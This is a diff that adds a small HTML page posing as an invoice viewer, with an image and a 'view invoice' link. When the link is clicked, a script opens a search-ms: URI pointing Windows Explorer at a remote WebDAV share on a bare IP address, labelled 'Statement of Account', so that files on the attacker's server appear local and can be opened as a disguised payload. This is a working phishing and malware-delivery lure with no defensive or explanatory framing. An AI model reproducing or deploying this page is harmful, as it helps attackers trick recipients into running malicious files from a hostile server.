@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+   
+    <br>
+    <a id="searchLink" href="#"><img src="https://files.catbox.moe/tkkfkk.png" width="200px" height="auto"><br>view invoice</a>
+    
+    <script>
+        // Add a click event listener to the link
+        document.getElementById('searchLink').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+            
+            // Construct the search URL
+            var searchQuery = 'Statement of Account.pdf';
+            var crumb = 'location:\\\\38.62.245.50@5000\\DavWWWRoot';
+            var displayName = 'Statement of Account';
+            var searchUrl = 'search-ms:query=' + searchQuery + '&crumb=' + crumb + '&displayname=' + displayName;
+            
+            // Open a new window with the search URL
+            window.open(searchUrl);
+        });
+    </script>
+</body>
+</html>
